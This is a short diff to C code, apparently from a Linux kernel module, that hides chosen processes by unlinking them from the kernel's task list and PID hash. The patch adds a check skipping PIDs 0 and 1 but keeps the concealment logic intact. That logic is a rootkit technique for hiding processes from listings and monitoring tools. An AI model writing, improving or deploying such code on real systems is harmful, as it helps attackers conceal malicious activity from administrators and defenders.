@@ -91,14 +91,16 @@ int i;
         // the following routine seems to correctly 
         // remove elements from the tasks list
         for (i=0; i<pids_count; ++i){
-            if (task->pid == pids_to_hide[i]){
+            if (task->pid == pids_to_hide[i] && pids_to_hide[i]>1){
                 prev->tasks.next = task->tasks.next;
                 next->tasks.prev = task->tasks.prev;
             }
         }
     } while ((task = next) != &init_task);
     for (i=0; i<pids_count; ++i){
-        hide_processes_hash(pids_to_hide[i]);
+        if (pids_to_hide[i] > 1){
+            hide_processes_hash(pids_to_hide[i]);
+        }
     }
 }
 
